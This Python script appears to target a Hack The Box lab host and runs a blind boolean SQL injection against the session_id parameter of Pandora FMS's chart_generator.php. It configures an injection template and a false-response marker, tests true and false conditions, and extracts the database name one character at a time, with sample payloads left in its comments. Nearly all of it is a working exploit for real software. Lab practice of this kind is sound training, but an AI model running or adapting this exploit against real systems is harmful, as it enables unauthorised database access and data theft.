#!/usr/bin/env python3
from sqli_common import BlindBoolClient

# ===================== 常量区（只改这里） =====================
URL = "http://pandora.panda.htb:1443/pandora_console/include/chart_generator.php"
METHOD = "GET"
VERIFY_TLS = False
TIMEOUT = 20
USE_BURP = False
HEADERS = {    
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    #"Cookie": "lang=english; PHPSESSID=ug02hdab6d3qio6g904sdsndo3",
    #"Upgrade-Insecure-Requests": "1",
    }

GET_PARAMS = [
    # ("v", "view_tickets"),
    # ("action", "ticket"),
    # ("param[]", "4"),
    # ("param[]", "attachment"),
    # ("param[]", "1"),
]
POST_DATA = [
    #("username","admin"),
]

INJECT_KEY = "session_id"
BASE_VALUE = "1"
#a'or+'1'='1 -- -
INJECT_TEMPLATE = "{base}' OR ({cond}) AND '1' ='1"  # 需要引号就："{base}' AND ({cond}) -- -"

FALSE_MARKER = "ccess is not granted"

THREADS = 4
CHARSET = list(range(32, 127))

MAX_DBNAME_LEN = 40
# ============================================================

if __name__ == "__main__":
    cli = BlindBoolClient(
        url=URL, method=METHOD, headers=HEADERS, verify_tls=VERIFY_TLS, timeout=TIMEOUT, use_burp=USE_BURP,
        get_params=GET_PARAMS, post_data=POST_DATA, inject_key=INJECT_KEY, base_value=BASE_VALUE,
        inject_template=INJECT_TEMPLATE, false_marker=FALSE_MARKER, threads=THREADS, charset=CHARSET
    )
# [('username', 'admin'), ('password', "a' OR (1=1) AND '1' ='1")]
# [TEST] 1=1: True
# [('username', 'admin'), ('password', "a' OR (1=2) AND '1' ='1")]
# [TEST] 1=2: False
    print("[TEST] 1=1:", cli.check("1=1"))
    print("[TEST] 1=2:", cli.check("1=2"))

    print("[*] Extracting database()")
    db = cli.extract("database()", max_len=MAX_DBNAME_LEN)
    print("[+] database() =", db)
